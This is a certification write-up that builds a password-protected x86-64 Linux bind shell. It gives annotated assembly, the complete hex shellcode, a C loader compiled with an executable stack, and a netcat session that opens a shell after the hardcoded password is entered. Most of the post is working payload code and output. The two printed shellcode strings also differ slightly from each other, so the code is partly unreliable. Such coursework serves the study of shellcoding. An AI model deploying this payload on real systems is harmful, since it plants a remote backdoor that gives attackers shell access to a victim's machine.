---
title: SLAE64 - Assignment 1A - Password-Protected Bind TCP Shellcode
author: fwinsnes
date: 2021-01-20 13:44:00 +0800
categories: [SLAE64]
tags: [assembly, shellcoding]
---

#### Introduction

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have 
a close look at Linux Bind Shells with password protection. 

A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of 
the compromised system, instead of arranging a specific connection on a trivial address. Furthermore, after the connection is established, a shell is executed, granting 
interaction to the attacker

The first assignment from the seven is divided in two sections:

+ A: Requires the creation of a Bind Shell with password protection through the Assembly language, and converting such into shellcode. 
+ B: The discussed Bind Shell provided during the course should be modified, in order that it no longer possesses any form of NULL bytes (00). 

As exercise A is already quite a complex and long exercise, the first assignment will be segmented in two different posts, thing which may repeat within the second assignment. 
During the length of this post, you will observe the solution for exercise A.
Moreover, the main idea of a Bind Shell and process of programming such has already been explored [here](https://whitecr0wz.github.io/posts/SLAE-Bind/). Therefore, I thought of 
focusing the blog's topic on the new addition regarding the password protection instead, which is by itself rather complex. 

##### Theory

If you remember the [x86 version of this assignment](https://whitecr0wz.github.io/posts/SLAE-Bind/), you'd remember that the required functions for a Bind Shell are the 
following:

+ Socket

+ Bind

+ Listen

+ Accept

+ Dup2

+ Execve

After the dup2 syscall has been satisfied and executed, the connection should already possess the ability to interact with the other gadget. Therefore, we could send a message 
and receive information from the other device. The process will be the following:

+ Socket

+ Bind

+ Listen

+ Accept

+ Dup2

+ Function that is only executed if the comparison ends up not matching. (write failure message)

+ Function that asks for the passcode (write). After the dup2 syscall is initialized, a JMP will be set so that the flow directly continues to this function.

+ Function that reads the input (read).

+ Function that compares the input with the intended passcode. If they do not match, jump to the failure function.

+ Execve

##### Time to stick our hands into the mud

Let's start with the failure function, right after dup2.

The process should be the following.

Arguments required for write according to the man page: ```ssize_t write(int fd, const void *buf, size_t count);```

+ It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1.
+ RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen.
+ RSI will hold temporarely and push the value to print to the screen. 
+ RSI will then copy the value from RSP.
+ DL will be given the length of the entire string.
+ This should write "Incorrect credentials. " into the client's screen.

```term
        jmp question           ; Jump to the "question" function.

halt:

        xor rax, rax           ; Zeroes out RAX.
        xor rdi, rdi           ; Zeroes out RDI.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDX.

        push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                               ; additional character that isn't needed (I.E an - or <)

        inc al                 ; Increments AL, giving the value 1 for the syscall write.
        inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

        add si, ' '            ; Blank space.
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        mov rsi, 'entials.'    ; Inserts value 'entials.' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        add rsi, 'cred'        ; Inserts value 'cred' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        xor rsi, rsi           ; Zeroes out RSI.

        add si, 't '           ; Inserts value 't ' into SI
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'Incorrec'    ; Inserts value 'Incorrec' into RSI
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Incorrect credentials. "
        mov dl, 34             ; Gives DL the length of the entire string, which should be around 34. If DL is given a bigger value than the real one (I.E 50), the password will 
                               ; be printed when this message pops up.
        syscall                ; The syscall is executed.
```

Great, the failure function has already been set, let us continue with the function "question".

The process should be incredibly similar to the failure function, as the main point of both is to write to the screen:

Arguments required for write according to the man page: ```ssize_t write(int fd, const void *buf, size_t count);```

+ It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1.
+ RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen.
+ RSI will hold temporarely and push the value to print to the screen. 
+ RSI will then copy the value from RSP.
+ DL will be given the length of the entire string.
+ This should write "Introduce your password:" into the client's screen.

```term
question:

        xor rax, rax           ; Zeroes out RAX
        xor rdi, rdi           ; Zeroes out RDI
        xor rsi, rsi           ; Zeroes out RSI
        xor rdx, rdx           ; Zeroes out RDX

        push rdi               ; Pushes the NULL DWORD (0x00000000) of RDI into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an 
                               ; additional character that isn't needed (I.E an - or <).

        inc al                 ; Increments AL, giving the value 1 for the syscall write.
        inc rdi                ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen.

        mov rsi, 'assword:'    ; Inserts value 'assword:' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'e your p'    ; Inserts value 'e your p' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'Introduc'    ; Inserts value 'Introduc' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI. The complete phrase should be "Introduce your password:"

        mov dl, 28             ; Gives DL the length of the entire string, which should be around 28. If DL is given a bigger value than the real one (I.E 50), the string will 
                               ; be printed several times and lack certain characters.
        syscall                ; The syscall is executed.
```

We can now proceed with the read function, which will obtain the input.

The process should be the following:

Arguments required for write according to the man page: ```ssize_t read(int fd, void *buf, size_t count);```

+ The value of RAX is set to 0, as it is the value for the read syscall.
+ The value of RDI is quite irrelevant, therefore, it is zeroed as well.
+ RSI is inserted the value of RSP.
+ DL is given the quantity of bytes to read. Nonetheless, as long as the quantity is as big as the input, anything goes!

```term
read:

        xor rax, rax           ; Zeroes out RAX.
        xor rdi, rdi           ; Zeroes out RDI.
        xor rdx, rdx           ; Zeroes out RDX.

        push rdx               ; Pushes the NULL DWORD (0x00000000) of RDX into the stack.
        pop rbp                ; Pops the NULL DWORD in RBP.
        push rbp               ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an
                               ; additional character that isn't needed (I.E an - or <).

        mov rsi, rsp           ; Copies the value of RSP into RSI.

        mov dl, 30             ; Gives DL the quantity of bytes to read, anything beyond intended should work as well.
        syscall                ; The syscall is executed.
``` 

Finally, we are left with the comparison, this is where the fun begins. The process should follows a very specific procedure:

+ RDI is given the value of RSP. In other words, RDI should hold the value of the input.
+ RSI is used in order to save the password to compare with.
+ RCX will be used as a counter.
+ The instructions ```repe cmpsb```, in simple terms, will compare every byte of RDI with RSI, as long as these match, the Zero flag (ZF) will be set. Furthermore, if all 16 bytes are the same, the ZF will remain deployed.

+ If the ZF has not been set after the ```repe cmpsb``` operations, it means that the input was incorrect, therefore, a JNZ jump has been set pointing towards the halt function, giving the failure message and repeating the loop.

```term
comparison:
                               ; Password: WjbkN3yQRpKVEFbA
        mov rdi, rsp           ; Copies the value of RSP into RSI. This will copy what was read on the previous function.

        xor rax, rax           ; Zeroes out RAX.
        xor rsi, rsi           ; Zeroes out RSI.
        xor rdx, rdx           ; Zeroes out RDX.

        mov rsi, 'RpKVEFbA'    ; Inserts value 'RpKVEFbA' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, 'WjbkN3yQ'    ; Inserts value 'WjbkN3yQ' into RSI.
        push rsi               ; Pushes the value of RSI into the stack.

        mov rsi, rsp           ; Copies the value of RSP into RSI.

        xor rcx, rcx           ; Zeroes out RCX
        mov cl, 16             ; Gives CL a value of 16. This value should remain the same length as the password (WjbkN3yQRpKVEFbA), as this value will be crucial for 
                               ; comparison.
                               ; If given less, the complete password isn't needed. If given more, the credential will not work even if sent correctly.

        repe cmpsb             ; Will compare the strings and check if such match. If they do, it sets the Zero flag (ZF).
        jnz halt               ; Jump if the as long as the Zero flag (ZF) is not set, this means that if the password is incorrect, it should redirect the flow to the error 
                               ; message.
```

#### Final Code

The full code can be found [here](https://github.com/whitecr0wz/SLAE/blob/main/SLAE64/Assignment_1/1.asm)

#### Shellcode

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; 
done;echo 
\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x66\x6a\x29\x66\x58\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x52\x0f\x05\x48\x89\xc3\x66\x6a\x31\x66\x58\x48\x89\xdf\x52\x52\x66\x68\
x23\x28\x66\x6a\x02\x48\x89\xe6\xb2\x1e\x0f\x05\x66\x6a\x32\x66\x58\x48\x89\xdf\x48\x31\xf6\x0f\x05\x66\x6a\x2b\x66\x58\x48\x89\xdf\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc5\x
48\xff\xc6\x48\xff\xc6\x48\xff\xc6\x66\x6a\x21\x66\x58\x48\x89\xef\x48\xff\xce\x0f\x05\x75\xf1\xeb\x4d\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xf
f\xc7\x66\x83\xc6\x20\x56\x48\x31\xf6\x48\xbe\x65\x6e\x74\x69\x61\x6c\x73\x2e\x56\x48\x31\xf6\x48\x81\xc6\x63\x72\x65\x64\x56\x48\x31\xf6\x66\x81\xc6\x74\x20\x56\x48\xbe\x49\x6e
\x63\x6f\x72\x72\x65\x63\x56\x48\x89\xe6\xb2\x22\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xff\xc7\x48\xbe\x61\x73\x73\x77\x6f\x72\x64\x3a\
x56\x48\xbe\x65\x20\x79\x6f\x75\x72\x20\x70\x56\x48\xbe\x49\x6e\x74\x72\x6f\x64\x75\x63\x56\x48\x89\xe6\xb2\x1c\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x52\x5d\x55\x48\x89\x
e6\xb2\x1e\x0f\x05\x48\x89\xe7\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x48\xbe\x52\x70\x4b\x56\x45\x46\x62\x41\x56\x48\xbe\x57\x6a\x62\x6b\x4e\x33\x79\x51\x56\x48\x89\xe6\x48\x31\xc
9\xb1\x10\xf3\xa6\x0f\x85\x32\xff\xff\xff\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$
```

Let's execute this within the C format:

```term
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x66\x6a\x29\x66\x58\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x52\x0f\x05\x48\x89\xc3\x66\x6a\x31\x66\x58\x48\x89\xdf\x52\x52\x66\x68
\x23\x28\x66\x6a\x02\x48\x89\xe6\xb2\x1e\x0f\x05\x66\x6a\x32\x66\x58\x48\x89\xdf\x48\x31\xf6\x0f\x05\x66\x6a\x2b\x66\x58\x48\x89\xdf\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc5\
x48\xff\xc6\x48\xff\xc6\x48\xff\xc6\x66\x6a\x21\x66\x58\x48\x89\xef\x48\xff\xce\x0f\x05\x75\xf1\xeb\x4d\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\x
ff\xc7\x66\x83\xc6\x20\x56\x48\x31\xf6\x48\xbe\x65\x6e\x74\x69\x61\x6c\x73\x2e\x56\x48\x31\xf6\x48\x81\xc6\x63\x72\x65\x64\x56\x48\x31\xf6\x66\x81\xc6\x74\x20\x56\x48\xbe\x49\x6
e\x63\x6f\x72\x72\x65\x63\x56\x48\x89\xe6\xb2\x22\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x57\x5d\x55\xfe\xc0\x48\xff\xc7\x48\xbe\x61\x73\x73\x77\x6f\x72\x64\x3a
\x56\x48\xbe\x65\x20\x79\x6f\x75\x72\x20\x70\x56\x48\xbe\x49\x6e\x74\x72\x6f\x64\x75\x63\x56\x48\x89\xe6\xb2\x1c\x0f\x05\x48\x31\xc0\x48\x31\xd2\x52\x5d\x55\x48\x89\xe6\xb2\x1e\
x0f\x05\x48\x89\xe7\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x48\xbe\x52\x70\x4b\x56\x45\x46\x62\x41\x56\x48\xbe\x57\x6a\x62\x6b\x4e\x33\x79\x51\x56\x48\x89\xe6\x48\x31\xc9\xb1\x10\x
f3\xa6\x0f\x85\x35\xff\xff\xff\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$ gcc bind_password.c -o bind_password -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1$ ./bind_password 
Shellcode Length:  353

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@whitecr0wz:~# rlwrap nc 192.168.100.205 9000 -v 
192.168.100.205: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.100.205] 9000 (?) open
Introduce your password:password
Incorrect credentials. Introduce your password:WjbkN3yQRpKVEFbAF
python3 -c 'import pty;pty.spawn("/bin/bash")'
whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1$ id 
id 
uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1$
```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64–27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_1/).
